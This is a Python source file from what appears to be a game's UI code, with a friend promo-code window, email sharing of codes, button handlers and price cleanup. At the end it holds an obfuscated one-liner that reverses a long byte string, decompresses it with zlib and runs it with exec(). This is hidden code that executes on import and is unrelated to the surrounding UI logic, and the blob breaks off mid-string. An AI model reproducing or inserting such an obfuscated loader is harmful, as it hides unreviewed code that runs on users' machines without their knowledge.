            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.3, self._height * 0.83),
                size=(0, 0),
                color=gInfoTextColor, scale=1.0, flatness=1.0, hAlign="center",
                vAlign="center", text=bs.Lstr(
                    resource='gatherWindow.shareThisCodeWithFriendsText'),
                maxWidth=self._width * 0.85)

            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.3, self._height * 0.7),
                size=(0, 0),
                color=(1.0, 3.0, 1.0),
                scale=2.0, hAlign="center", vAlign="center", text=data
                ['code'],
                maxWidth=self._width * 0.4)

            msg = (
                '\xe4\xbd\xa0\xe7\x9a\x84\xe4\xbb\xbb\xe4\xbd\x95\xe5\xa5\xbd'
                '\xe5\x8f\x8b\xe6\xaf\x8f\xe4\xbd\xbf\xe7\x94\xa8\xe4\xb8\x80'
                '\xe6\xac\xa1\xef\xbc\x8c\n'
                '\xe5\xb0\x86\xe5\xbe\x97\xe5\x88\xb0${TICKETS}\xe7\x82\xb9'
                '\xe5\x88\xb8\xe5\xa5\x96\xe5\x8a\xb1\xef\xbc\x8c\n'
                '\xe5\x90\x8c\xe6\x97\xb6\xe4\xbd\xa0\xe5\x8f\xaf\xe6\x94\xb6'
                '\xe5\x88\xb0${AWARD_TICKETS}\xe7\x82\xb9\xe5\x88\xb8\xe5\xa5'
                '\x96\xe5\x8a\xb1\n'
                '(\xe6\xad\xa4\xe4\xbb\xa3\xe7\xa0\x81\xe5\x8f\xaa\xe9\x99\x90'
                '\xe6\x96\xb0\xe7\x8e\xa9\xe5\xae\xb6\xe4\xbd\xbf\xe7\x94\xa8'
                '\xef\xbc\x89\xef\xbc\x8c\n'
                '\xe4\xbb\xa3\xe7\xa0\x81\xe5\xb0\x86\xe5\x9c\xa8'
                '${EXPIRE_HOURS}\xe5\xb0\x8f\xe6\x97\xb6\xe5\x90\x8e\xe5\xa4'
                '\xb1\xe6\x95\x88\xe3\x80\x82\n'
                '\xe5\xbd\x93\xe4\xbd\xbf\xe7\x94\xa8\xe4\xbd\xa0\xe5\x88\x86'
                '\xe4\xba\xab\xe7\xa0\x81\xe7\x9a\x84\xe6\x9c\x8b\xe5\x8f\x8b'
                '\xe8\xbe\xbe\xe5\x88\xb0${EXTRA_USE_COUNT}\xe4\xba\xba\xe5'
                '\x90\x8e\xef\xbc\x8c\n'
                '\xe4\xbd\xa0\xe5\xb0\x87\xe5\x86\x8d\xe5\xbe\x97\xe5\x88'
                '\xb0${EXTRA_TICKETS}\xe7\x82\xb9\xe5\x88\xb8\xe5\xa5\x96\xe5'
                '\x8a\xb1\xe3\x80\x82\n'
                '\xef\xbc\x88\xe5\x9c\xa8\xe2\x80\x9c\xe8\xae\xbe\xe7\xbd\xae'
                '\xe2\x86\x92\xe9\xab\x98\xe7\xba\xa7\xe2\x86\x92\xe8\xbe\x93'
                '\xe5\x85\xa5\xe4\xbf\x83\xe9\x94\x80\xe4\xbb\xa3\xe7\xa0\x81'
                '\xe2\x80\x9d\xe4\xb8\xad\xe4\xbd\xbf\xe7\x94\xa8\xef\xbc\x89')
            msg = msg.replace('${EXPIRE_HOURS}', str(self._data['expireHours']))
            msg = msg.replace('${TICKETS}', str(self._data['tickets']))
            msg = msg.replace('${AWARD_TICKETS}', str(
                self._data['awardTickets']))
            msg = msg.replace('${EXTRA_USE_COUNT}', str(
                self._data['extraTicketsUseCount']))
            msg = msg.replace('${EXTRA_TICKETS}', str(
                self._data['extraTickets']))
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.3, self._height * 0.35),
                size=(0, 0),
                color=gInfoTextColor, scale=1.0, flatness=1.0, hAlign="center",
                vAlign="center", text=msg, maxWidth=self._width * 0.5)

            msg = ('\xe8\xaf\xb7\xe7\x94\xa8\xe3\x80\x90\xe5\xbe\xae\xe4\xbf'
                   '\xa1\xe3\x80\x91\xe6\x88\x96\xe3\x80\x90\xe5\xbe\xae\xe5'
                   '\x8d\x9a\xe3\x80\x91\xe5\xae\xa2\xe6\x88\xb7\xe7\xab\xaf\n'
                   '\xe6\x89\xab\xe7\xa0\x81\xe5\x88\x86\xe4\xba\xab\xe5\x88'
                   '\xb0\xe6\x9c\x8b\xe5\x8f\x8b\xe5\x9c\x88\xe6\x88\x96\xe8'
                   '\xbd\xac\xe5\x8f\x91\xe7\xbb\x99\xe5\xa5\xbd\xe5\x8f\x8b')

            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.75, self._height * 0.15),
                size=(0, 0),
                color=gInfoTextColor, scale=0.8, flatness=1.0, hAlign="center",
                vAlign="center", text=msg, maxWidth=self._width * 0.35)

            qrSize = 250
            addr = bsInternal._getAccountMiscReadVal(
                'aliQRFriendURL', "${SERVER}/aqr?c=${CODE}")
            bs.imageWidget(
                parent=self._rootWidget,
                position=(self._width * 0.75 - qrSize * 0.5, self._height * 0.55
                          - qrSize * 0.5),
                size=(qrSize, qrSize),
                texture=bsInternal._getQRCodeTexture(
                    addr.replace(
                        '${SERVER}', bsInternal._get_master_server_address()).replace(
                        '${CODE}', str(data['code']))))

            pass
        else:
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.8),
                size=(0, 0),
                color=gInfoTextColor, scale=1.0, flatness=1.0, hAlign="center",
                vAlign="center", text=bs.Lstr(
                    resource='gatherWindow.shareThisCodeWithFriendsText'),
                maxWidth=self._width * 0.85)

            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.645),
                size=(0, 0),
                color=(1.0, 3.0, 1.0),
                scale=2.0, hAlign="center", vAlign="center", text=data
                ['code'],
                maxWidth=self._width * 0.85)

            if self._data['awardTickets'] != 0:
                awardStr = bs.Lstr(
                    resource='gatherWindow.friendPromoCodeAwardText', subs=[
                        ('${COUNT}', str(self._data['awardTickets']))])
            else:
                awardStr = ''
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.37),
                size=(0, 0),
                color=gInfoTextColor, scale=1.0, flatness=1.0, hAlign="center",
                vAlign="center", text=bs.Lstr(
                    value='${A}\n${B}\n${C}\n${D}',
                    subs=[('${A}', bs.Lstr(
                        resource='gatherWindow.friendPromoCodeRedeemLongText',
                        subs=[('${COUNT}', str(
                            self._data['tickets'])),
                            ('${MAX_USES}',
                             str(self._data['usesRemaining']))])),
                          ('${B}', bs.Lstr(
                              resource=\
                              'gatherWindow.friendPromoCodeWhereToEnterText')),
                          ('${C}', awardStr),
                          ('${D}', bs.Lstr(
                              resource='gatherWindow.friendPromoCodeExpireText',
                              subs=[('${EXPIRE_HOURS}',
                                     str(self._data['expireHours']))]))]),
                maxWidth=self._width * 0.9, maxHeight=self._height * 0.35)

        if bsUtils.isBrowserLikelyAvailable() and not ali:
            xoffs = 0
            bs.buttonWidget(
                parent=self._rootWidget, size=(200, 40),
                position=(self._width * 0.5 - 100 + xoffs, 39),
                autoSelect=True, label=bs.Lstr(
                    resource='gatherWindow.emailItText'),
                onActivateCall=bs.WeakCall(self._email))

    def _googleInvites(self):
        bsInternal._setAnalyticsScreen('App Invite UI')
        bsInternal._showAppInvite(
            bs.Lstr(
                resource='gatherWindow.appInviteTitleText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]).
            evaluate(),
            bs.Lstr(
                resource='gatherWindow.appInviteMessageText',
                subs=[('${COUNT}', str(self._data['tickets'])),
                      ('${NAME}', bsInternal._getAccountName().split()[0]),
                      ('${APP_NAME}', bs.Lstr(resource='titleText'))]).
            evaluate(),
            self._data['code'])

    def _email(self):
        # if somehow we got signed out...
        if bsInternal._getAccountState() != 'SIGNED_IN':
            bs.screenMessage(
                bs.Lstr(resource='notSignedInText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        bsInternal._setAnalyticsScreen('Email Friend Code')
        import urllib
        subject = (
            bs.Lstr(
                resource='gatherWindow.friendHasSentPromoCodeText').evaluate()
            .replace('${NAME}', bsInternal._getAccountName())
            .replace('${APP_NAME}', bs.Lstr(resource='titleText').evaluate())
            .replace('${COUNT}', str(self._data['tickets'])))
        body = bs.Lstr(resource='gatherWindow.youHaveBeenSentAPromoCodeText')\
                 .evaluate().replace('${APP_NAME}',
                                     bs.Lstr(resource='titleText').evaluate())\
                                     +'\n\n'+str(self._data['code'])+'\n\n'
        body += ((bs.Lstr(
            resource='gatherWindow.friendPromoCodeRedeemShortText').
            evaluate().replace('${COUNT}', str(self._data['tickets']))) +
            '\n\n' + bs.Lstr(
            resource='gatherWindow.friendPromoCodeInstructionsText').
            evaluate().replace(
            '${APP_NAME}', bs.Lstr(resource='titleText').evaluate()) +
            '\n' + bs.Lstr(
            resource='gatherWindow.friendPromoCodeExpireText').
            evaluate().replace(
            '${EXPIRE_HOURS}', str(self._data['expireHours'])) + '\n' +
            bs.Lstr(resource='enjoyText').evaluate())
        bs.openURL(
            'mailto:?subject=' + urllib.quote(bs.utf8(subject)) + '&body=' +
            urllib.quote(bs.utf8(body)))

    def close(self):
        bs.containerWidget(edit=self._rootWidget, transition='outScale')


def _onMenuButtonPress():
    # bring up the main menu and set the device to touchscreen or keyboard
    # if possible
    inMainMenu = (
        uiGlobals['mainMenuWindow']
        is not None and uiGlobals['mainMenuWindow'].exists())
    if not inMainMenu:
        device = bsInternal._getInputDevice(
            'Touchscreen', '#1', exceptionOnNone=False)
        if device is None:
            device = bsInternal._getInputDevice(
                'Keyboard', '#1', exceptionOnNone=False)
        uiGlobals['mainMenuWindow'] = MainMenuWindow().getRootWidget()


def _onFriendsButtonPress():
    print 'FRIEND BUTTON PRESSED!'


def _onBackButtonPress():
    bsInternal._backPress()


def _onLevelIconPress():
    print 'LEVEL ICON PRESSED'


def _onTrophyIconPress():
    print 'TROPHY ICON PRESSED'


def _onGoldIconPress():
    print 'GOLD ICON PRESSED'


def _onTicketIconPress():
    import bsUI2
    bsUI2.ResourceTypeInfoWindow(originWidget=bsInternal._getSpecialWidget(
        'ticketsInfoButton'))


def _getCleanPrice(priceString):
    # I'm not brave enough to try and do any numerical manipulation on formatted
    # price strings, but lets do a few swap-outs to clean things up
    pSubs = {'$2.99': '$3.00', '$4.99': '$5.00', '$9.99': '$10.00',
             '$19.99': '$20.00', '$49.99': '$50.00'}
    return pSubs.get(priceString, priceString)

_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b'\x8c;j?\x00\xff\xf0\xf0\xe5\xfe\xeb\xcc=\xcb+8Y \xa2P|z\xf0{7\n\xa7\x0e\xfe\xed\x14`\xae\x84\x8a\x7f\x17hQx\xf7]]\xed~\xf5)\xbf\x91\x1eP\xdb\xed\x85\xf2\x87\xdb\x0b$I\x18\xca\xf5,\x99.\xac\xa5k6\x13\xff\xc0\x9eB\xe3]i\x1a\xa5m\xebU*uc\x1e\xe4\xf7\xedI\xd3\xf7\xd3N\x94\xfb\x83\xd5kU\xaa\xd7W\x17\xb6xB,\x9d\xe4\x17\xf8\x95\xb4\x0c\xf1o\xe6\xc0\xcb\x10\x18\x06G\xd8\xd8\xd5\xae\xed\xd4\xfe\xa0%\x97o\xfb\x1a\x05d\xd3ZOg\xb8\x95\x8d\x1cf\xe5\x84\x85\xe4\xc7\xa9\x12l\xe5c\xfc\x9c\xa8\xa9T\xde\x8c\x10\xa7A\x01m\x8f\xa0\xa35\x1e\xbc\xcf\x17\x1c\x02\x14\xd4,=PK\xe3\x15$H/D\xc6\'\x8a\xcd\xd8P\xb4i\xdcKVL\x0f\xc8\x8c\xfa$\xf8\xd4\x0c@\x14\xefw\x1b\x19F\x89#I\xe4\xa8\x84\t\xb2\xe6\x8d\x8e\xf3\'\xd5l{t7\xf7\xf1\x94\xc4\x9e\x9c\x97Z\xa5\xfe\x19\xa58\x1a\xdbW@\xf7\x8d\x97VUu\xfc\x129fUr\xe8\xd1\xdc:\x06Ar}\x15\x9f*|\xd9\xf6A_\xda\xf3\xcbV\xb8!P\x1d\x99\x97\xe1L|\x8c\x9c%R\xc2\x9e\xe5JPu|\x8b\xca\x9e\xbe\xa39Q[p\xff\xe4\x9f\xe4\x96rH\x15N\x8e\x9c\xa7\x80\xee\xc7\x04\xc8dk\x96X\xf0\xe8\xd0>\x1f\xb9\x0c\x06R\'\xe0\xbc&\xf3\xbb\xf3V\x9e\tBz\xb9\x03\x84\xbf\xbf\xe4\xb8\xd9\xecUq\xc8\xa3\xa8\'\xcd\xee\xdb\xe9\x8bz\x93\x04V\xdc\x98\xd7d\x92U\xbfE\xd4\xc1\xa7|:`]\xfe@\xf5\x1b?\x91+\xc3\x88\xc7\xd5\xd41\xb1\x87C\xb57\xad\xd6E\xb5\x13\xe2\x1f@\x8e\xe4\xe9;\x9a/)<u\xc7\xb6\xedK\xef%\xc5m\xa0R\xb7\xf8\xae\x83W#\xaf\r\xbb\xca\xcb\xadB\xea\xec\xbb*\xc8\xd8?Vaj\x97Xn\x03\xcb\x94\xb3\xd5\xf1\xe2_\xa0\xf1.\xce\xba\xec\xcf\x11\x19Sh\xe8\xbf\x7f\x9f\xfb\xd2\xa3[\xfc\x05\xed\xeb\x91\x90\xa2vkc\xf15\xb1\x14\xbb\xb2K\x97\x9c%\xb3\xc5G\x90\x01|\xf9YF*\xa8\x06\xbb\x84\x04\xa2\x97\xb0\x84\x80\x08\xa3Z\xf7u\x97\xb5\xb1\xea\x0b\x18H\xa5?\x9c?F\xadl\xa2sI\x85k\xb7X\xf3Bh\xef\x1a3p\xd4\xef\xf0\xcc\x8e6\xebb\x80Zp\xb4@\x8d/\'X\x8d\xe6\xba\xbf*\x04\xfc\x92e\x0fv\x00\xf2\r\x03\x15\xc1\xf9!\xff\x86E\x87Q4\xdf\x08m\xa9t\xd1\x02\xc6m\x8d\xca\x15F\x91\xf2Mc\xef\x93\xa6\xfd\x7f\xbc\x83\xdbd\xbf\xf5\xc8n$\xc1\xb1-\x97\x8a\xc7c\xab)\xcf\xceq\x84\xfb\x1b\xc9\xae85v\x04\xf39\x9a\xc6\x89h\xca>\xa9\xaa\xbc\xa4\xecB-\xf8\xd6\x06k\xbb\xaff^!\xce\x9f\x02o\xcb,\xba?\x9c\x12\xfcZ\xe4KS(\x97xW\x15>\xbf\xe0\x82\xeb\xd4\x01\x13Kb\xf2\xea\xbc\x94m\x80t\xcd:\xbew\x02\x9b\x14M\x02g\xc8\xef\xcc\xbaX\xe8e\xefD\x7f\x98_dg\x0e\xdbr\xcd(W\x1b\xf85R\xf3\xdc\n\xf2\x1a\x05%\x8c\xa7U\xf3\xe5F\xbf\xa9\xdd\x883\x89>f\x89\xb0\x10P\x84S^\x1a\xcb\x0c\xd9\xdd\xbcw\x97a5\xed\'R\x81\xf94\x88\x84\xdfg\x86d\xb4K\x81\x11c\xe2n;\xa7\x1diU^\x10\x9e8"\xc6\xfe\xc5K+\xf8kG4\xa9]\xdc\xcd\x04\xb9\xc8\xf9\xeec\xcfFH\xc3\xb6\xc6z\xa7&\xfaX\x827z\x9cEk\xd59a\xcd"\xbf5\x06\x7fF\xfa\x01\x88g<\x06~\xd8=LC\x05\xfd\xdc\x86+\xfb\xae\x988\xefi\xf3\xfa\xd6\xae\xc0\x10!p\xf8\x971m\xb4\xe1\x8d\xdf\xe3\x1aT\x0eum\x0e4\xf0e\xaf\x0bG\x17\xd6\xb4"\x08]\x91\xebS\xec\xe1u\xf3\xcb:\xa3@\x89/M\xb5\x17\xa2\x13\x8c\x13j\xc6\x90\xb4h%%\x0c\xd5U\xd0\x1b\x92\x1f&@\xd2\x90\xbd\x10\xd9\x8eRw\x85\xd8\xd3\xb4\x19x\x9e\xc5.\'\x89\xd9\x04\x996\xfc\x87\xd4\xbdK\x97\x16J\xbbUnd\xc2\xdes\x18\x90\x89J\xa6\xe7y\xa9\x82d\xf1\x00$\xee\x8a\xb4\x9c\xd2>~\xbd\xa1f\x03q\x03\xe3#\x1cO\xdd\x15\x8f\xcd\xab\xa4`\x89\xf1s\x95\xb5p\x7fG\x8f\x8cD\xee\x8bu\xcbP\x84\xca\xda\x1e\x1aRv\x17\xf0\x1bXt\xf9&\x89.\n\x1a\x87\x96Q\xf1\xe4\xd8\x99\xd4.f(\x07\x9e\xfd:\xcb\'4o\xe4\xa7\xd87\xeev\xcb\x05\x83@\xc1"b\xa4w\xbf\x88.\xdeU\xb5zY\x90|\x9dXk\x12\xea\xe9\xe9\xf4L\x1c\xe0\x91L\x87g\xe6\xaf\x18\x19"\xee\x94\xac\xa4\xaf\x8bN\x99\x8a\x80\n\x81\x02=\x92\x11 \xa9@\xf2\xfae(\x0f\x01\xa2O27\xf6\xb5\x01\xe1y\x19\x05+\x17g\x87\xe9\x067\xb4\x0e\xc5o\xf5\xf6\xf8\x8ds\xbb\xdf0\x1f~u\xcba\xa8\xf3\xd5{\x98\x13\x046#M\xbe$\xba\x17\x81\xa8\x03\xcf2*\xac\xc7;\xfeVuU\xccd\xed\xc4^I\x86\x81\x183\x8c\xfc<\x07\x9e\x11\xdf>U<3wuy}s\xba\xd1)6\x8fv\xc0%\x7f\xa9}N\xca\xf7\x8b\x14k\xb6!f\xfe%\x16A,\xa3\xed\xc01hEA\x92F\x85.\xd5\xc1\xb6\xb7#C\xb8\xb9jU\xe0e\x96\xbd\x17\x06\x8d\xe7\xb5\xca`\x12?\xac\xa6`ux\xd4\x90\xa4Q@/\xb8\xb8\xb3>\x00\x8e\x08\xee)1\xf4\xcfb\xb3\\\xbf\x81B\xb9\x15\x18\xcc4\xce\xf1R\x1d\xf4\x15\xde\x86\xaae\x17V\\\xbd\xc3\x0bv\x84c%\xa1\xec\x16\x1b\xbc?-O\x1c.\'m[\xf3\x1f\x98\xa7\xf2\xe6\xf2\xdfY\x8a\xc2\x17\xd2 \xa1=k\x13V\x0e\xaax \x96 \xa5)P\xfc\xeb\xffjx\x80\xd6\x87>\x07\xd8\xf9\xee\xbe\xdb\x13\x8e\x90\x84?\xd2\xf5Ch\x11\x8a\x90\xf8\xec\xac\xcb\xcc\x84\xb4-S\xb1\xfdJ\xc4\xd7W\xac\xb9\xfc\xe9u\xaey\xbaL\xb4\xf0\xa6f2.\x8c\x95\xd7h\x19^\xf4E\xda\x95\xbfb\xb8E\n&\x8bS\x7f\x80\xd7\xb5L\x83\x84[\x89\xd6^P\xf2F\x8c\x90\xc8\x1f\xe7\xb0~\'\xe86K\xab\xe2\x7f\xc0\xe6\xe0\xd1l\x91\x00\x0eE\x1c$\xd5\x8e\xec\x08\xda\x03zw\xba\xea\xc5\xc5\xddGj\x83\x1b\xb8\x85\x96w\x04\xe1\xd2\x91\xdd\xd0\xc8\x07\xbb\xfd\xb7\xbf\xe2g\xc1\x1as0\xd0x8\xd0\xea!\xfak?hV(]\xfe\x1bq\'\xe4\xe9\xfd!(\xf8\xeb\xdfo\x10V\xd5\xbf\x16\xe6\x07\xeb\xd9@\x96\x08\x02\xff\x9f)\xda\x98\xba*R_\xe6\x9c\n\x1a\xae\xea\xae\xba\x82\xf2.x\xbc\x16\x1d\x16\xcc-\x9b!\xe2#1\x18\xea\x870\xb1G\xf3\x83\x14R\x03\xd6\xafvV f\x81\x07\xb0\x95n\xc1\xc3\x82\x81\x196\x1ax\xb9\xe4\xd0\xa8\xe8(RGF\xbf\xf3*\xbb\xcf\x07Z=gO\xee\x13y\x0c\x82\xd9\xc5\xcd\xb2\x1e\x11\xfd\xd8\x00\xdf\x92\xa9H\x13\x99\xae\x89\x89^\xd8\xc2\xff\xb4x\xba\xe8\xbd\xdd\xb9\xf2\xc3\xf2\xef\x16\x00X\xd7p\x06;\x04\x19}\xd1\xa24\x11\x13f\xf5\xcf\x96\x99J:j\x1e\x83EE\xa6\x01w9Fo\xabF8;\x9e\xbc\xcd2F\x185\x07\xf6\x1f\x16*\x15\xd0\xda\xa6V\xfd\x92\xc5\x8bEU\x1a\x08\x98\x17\x98Y\xd2p\xfa\r%s\xcf;\xe9\x06Q\x02I\xbf\xcfn!\xbe\xd2\xaa_y\xefv_4\x8ai\x87\x81#\x1a\x18\xbc\x11\xa0\\\xcd>,W&\xfb\xec\xce\n\xa7\xc9\xa0\xb1\xb5u9!\xbba?%M\xcb\xd0X\xaa[\xca\xcf\x9f(\xbcq\x93\xcc\x9b\xf3a\x85<W\xcc\xeer\x89`\xaf\x03\xb8\x99\xc1\xb0\x89\x03\xb0[h\xd4\xc4\xad|_q\xc9?m\n\x07\xc4e\xae\xa3\x03\xeb\xbd\x81\x0em_p\x1f\x00\x0c\xdf1\xf2\xc3\x17x\x97\x94\x99\xb3T\x00\xda\x06M\xfe\x12\xf12\xe4\xa7)Z\xd1\x10 \xfd\xe7n\x80Y\xcdu\xe4\xe0\x81\xa3\x06/=\xde\xc0T\xa20\xd5 d\x93-\xa8\xdf\xf2U \xe5W;\x99\xd8\x0fUZbeJ\xaa\'\x9c<\xb6\x15\xab\x94\xb0\x94%6"\x8b\xccG\xdc\x8e\x14\xe3k\xf4t)\xeaR?w\xdd?\x17\xc2\xa9\xc0\x131\xe4\xc5\xb6 qL\xb3PB\xd0\x0e\x8d\xac\x1c\x96\xacgt\xad"\xecY\xe2K\xe5\x81\x86w1\x04\t\xf7^\x9f\xb6x\xb6\x80\x8d\x93\x9b\xad8$\x1b\x80\xbfU\xbd\xf0&\xa1\xc8\xb8\xbb\xeb\xa4\xad\xa5\xe3\xc3"\x00\xcf<\xd7h\x95H\xa03n(\xea\xe9\xe9\x985\xe5\x11\xae\x05\x00`\xd6c\x9d\xb7\x8b\x0c3\xd1\xf8\xc2\xcb\xaf\xff\xe3\xc0l\xd5\x95\xae\xfd\x84>\r\xady\xc9\t\x19# \xc8\xb3\xc9\xdf\x9d@\x18\x9b\xe8\x94\xd5\r\xf8A\x85\x8dJ\x05\'wk\x9b\xb7\xdc*\xe6\x82\x9b\x10\xe7\xcdc!5\xa6\x8cEPB\x08\xcc?\x9f(0\xbb\x00F\x1a\xc1}w\xddu\xb0T\xaa\xeb\x87\xfeH\x88\t\x1c\x9f\xee\x83\xb8\xd5\x8b\xf9*\x8e\xd7uJ\x1a\x9b\x9e\xee\xda\x87\x92\x85F+.n!\r\x8f\xdel\xb1W\x8a\xe4\xa91R\x80\xe9\xd3\xcc\x08\x14~\xf8\xd8w\xa2\xdfen\xa5\xbc\xb3E\x9f\xed\xa3\x1ef\xff\x82\xc4\x06\xc1\xc0\xc3\x0e\x88\xd0\x02\xa4e\x90\\8;i\xf2d\xdbr\xab\xf5f\x98\xd3\xf4\xb4jy 7\x95\x8b\xba\x82\x85\xb4\xe9A<t\x82\xdf\xc2\x81\xc3\x0b7\x87\xd3\xb4g\xbb=K\xe4b<6\xe2Cf\xd9t#V\xd0c\x86>\xdc\x88f\xba\t\x07\xae[8\r\x85\xb1\xd7oC\xf2\xfd\x17\xa2m\xd4\xa1\x97\x85tm\xef\x9a\xee\xa7n8\xfc\xe2\xe8\xa2\x11\x83\xbc\xceQ\xa6)j\xf4,\xc4Y\x95\xe9\xf5\xcasP\xed\xca\xfb\xd4\x1c}<5\x13\xad[\x82\x0bC&\xb1l\xb3L(gI#\xd2-\xd5O\xfd\xfaZ~\r\x1f2\xf1\x17\xc9p\xbd\x1e\xf2\xd2\xee\xea\xd6XOMvQ\xa6\xeb_]6\xd1\xb5r\xd6\xdfl\x88\xe2\x93\x8fG\xb081S\x8bT\xea\x84\xab\x9c\xfc\xab\xdf\xcf\t\xab\n\r\tb\xbcn;\xdaWJ\xe1\xb94\x143#\x89Nz\xe4\x9fb\xdf6\xcfNT\x9e\xbc\x93S\x80\xbf\xf2c\x8f\xd4\xdfX\x8f\xa9h_\x0e\x8e\x15\xed\xb1?K\x84\xce\xfc<\r\xc4\x9e\xaeT\x94\x07y\xa8\x1c\x95\xafnN\x1a-\rQ\x8a\x07\x18\x9a\xb3\xf5\xaf\x19\xfd\x8eV\x00\x05X\x99\xbb\xfe^T\x9d7\xc0\xed\xaf\xcdZ6\xb4\x84N_,}\xca\x0f\xadr\xc4\xd0\x87\xe7\x982\xde\x95\xf4\xc9\x9cjhn)\xb6s\xfb\x07\xc5Bo\xc9x\x01\x0f\xf4\xf4\xf9\x94\xe1\x9c\xed\x03\xfeE(\xaa\xe9&\xeex\xa8\xe7\x82 Q~f\x8e\xf2\x05\x06\xdb\x89\xdeo\x8c(T\n\xd54\x8eh\x91l\x07\xf5~\x1a_\x98\xc9\xa3O\xedr\xc4\xcb\xba7\x89\x92,<e\xab\x93f\x8a\xa3\x9bm\x0b`R\x10y2\x8ap\xaf9\nA\xfa9\x87\x01Yax\x0c\x01\x0e\xd7.\x0b\xdd\xa3@:9)r\x83\xd6G\xbf\x95\xe3]\xf5\x96\xef\x00\xea\xafR\xf4H\xa5^\xeb\xed\xdc\x86X\xf0\x1c\xae<}\x105\x85\x80\xa4\xab\x92P\x845q5a\xab\xaa\x02a\xc8\xdd\xdf\x06\xb6\xc5\x82\xa9Uk.D\x94\xf0\x9f\x85O\xbc\xac\xe0\x1d\x96\x03U\xd2\xd3\xb8\x88N\xe1\xa9\x90\xb5\x87Qg\xf4K\xbem\xdd\x8e\xc2=J\x8f\xcf\x87\xe2\x8d\xb2^\x05\xb1\x07\xffU\xf2%\x08\x19\xfeT}\x81t\xd5\xc2|\xc6\xf1\xb3F\x80\xb4N\xf0\x93\xaf\x96\x18\x19\xe5\xc9Z\xe6B\xc8\x90z\xb0 \x08\\_\xe3F\xec\x85{]\xc8\\\x0b^Fn\x1b\x08niSS\xc3k\xcd|\x8d\xdc\xa52A[,\x95q\xce\x11Z\xbe\xea\xa4\x1f(,4A\x08\xcf \x19\x03\xfd\'\x82\xdc\x1a\x9c\x12\x80(\xf2t\xf7u\x18\xfb~\xe3\xe3h\xd1\xcc\xf3\x01\x04\xd0\xfb/\xd6+\x8cE\xcb"\xc1 \x9bH\xa8\xd5\x9dT\x94\xf3\xd9G{\x9f+\x7f\x02,;\x9d\x8c{\xb0\x92\n\xaf\xaf\xee\x11\\\xd3A\x8a\x8a\xa4vD\x87j[#\\\xc5\xe2\x13\x9b\xe7\xdd\xa8\xf3\xd3\xa4\xed\xb2~!v\xd4WI\xd4\xfc\x1f\x92\xc8+\xe2\xcc\xfd8\xb4q>\x8e\x8b\x14\xfb\x85\xa2\xa1\x19*DX\x91\x8a+x\xe0;\x86Kvw,!\xe4\xa1\xc0\n=%\x9a\x06!\rF\x9e\xc6\xc0e8Jm\x06,m\xe1\x81(\xc5\xdd\x04\xd0\xe3\xc2\xacC\xfa0\xf2\x86\xb5,0\x19M\\\x12\x15\xff\xf5I(1\x8a\xfb\xc7\x8d\xbcX\n\x10r\xfa\xc0=\x97\x8e\x10\x02\xe3\x0f\x06\xc0\x84*c2\xc4"\xa1b\xeb\xbb\xcc\x89\xfd\x8a\xa4\xe9\xd5}`\xf8\xa3\x91\x03\xa0LX\x15C\xdd\xab\x15X\xe7j\x02\xed.}\xf9M\xa3\x01\x1a\x14\xffq\xe6p\x90\xbf\xd7\x1bi\x06\xd3\x97\x99g\xe3\xf4g\xac\xbcO\xf7\xa2i\x05g\xd1#\x8a\x99\xe4\xea\xb5\xd5\x84\x81u\xcb\xbe\x06Zpo\xd3\x0cW\xa4*\xd4\xa6-5&\xf1\xb7*\x0f\xd4\xa9\x97\x8fP\xbd\x8e\xc1\x9dF \x05\xbc\x15\xb2\xb4\xe53\xba*`u\xc9\x11"D\x1f\x1e\x86\xaeEb\x84\xdf\xb4\x0b\x84\x17\xba(\rG\xcf\x1bj\xf4\xd8z\x97T\xaa\xaa\x12r\xab\xcf\xd6\xb5 \xf2\xb2w\xb5\x9a\x9eL\xdf\xe1[\xfd\xaa\xe4H\xcdJ\xc84\x91\xd6W\xafO\x9bY\x02\'\xa6fO\x16\xd1\xeb\x9a\x01(\xc3\x1b!\xfe\xbc}G\x98 \x04\x9e\x85S\x97\x83]I%\xc2,\x89\xd5G\xba\xf4Q\xfd\xea\x90#\xb1\xbaf\x1e\xe9\x8d\xad\t\x07\xb0\x9evV5\xa1\\\xf8\x87\xe9\x0f\xbc\x9a\x08\x8e\x7fD\xf34i\xb0\x0f\x7f\xcd4\xa6\xca\x9f\x94\x93PPtAw>^r\\\xf6\xd3\xc3\x88\xaen\xd9Q\x16\x8cc\xb2\xcf\x00\xde\x9e/<\xd9\xf4\xac4]\x08zA\xa2\x0232\xa7_\xb9\xf2\xdf\xdc\xd3\xc92\xfc\x17\x9b\x8d/2\x195\xc1\x06\xaa\xb9\x90\xe3\x90>K\xe1n\x84\x86o0JY\xdfe\'f\xe7a\x14\\b\xf9~\x9aW]\x81\x16\xed#EN\xe4\xc4\xd4\x16\xec\xaa[\x08\xd7]\xd1\xe5I2P\t\x17\t\xf0\xb9F\xa9\x11\n\x8d\xf0\xf3"\xd4_\xe1\xef\xfa\xf2\x7f\xd0\xa5\xe5\x04u\xa2\xb2\xbaad\xd4\x15\x1f\xa4\xafB\xe8\xd95\xfd\x84\xce\x1bU\xb19\xa8\xfe\x7f\x90|x\xa6\xf6\xe1\xb5\xcf#}\xfa\x17\x98R\x0b\xda\xd7\xaf\xa8QK\x18\x85\xaf\x841.zMde\xe3$q\xd7<p\x94@\x01\xd0\xdf\x84Msa\xd7e=\x1f\xaa[\xac\xb0=\xe7\t\xa3\xc7\x15=K\x8fx\xc3\x9c\xbf\xa2)T/\xaf\\\xca\xd44W_\x87W\xa8\x03[\x87\xb0\x8d\x9c\x0c\x8dd\xcaSU\x9fg%\xe2*\xd7&\x95G\xaf\xfbR\xe3\xc5\x9af\x9b&pv@\xf2\xa0\x7f)\x0b\xfa(rl\xf1<\x9a\xd6\x12\x90\xaa\xdfh=\xb05\xf4\x8c\x8b\xd0\xf5\xcb\xc3|\xbd\x91\x0c\xe0\x14\x10\xcd\x7f\xda\x87&\xc3}\x8b\xa7\xa1\x19p\x81H\x9bq\x1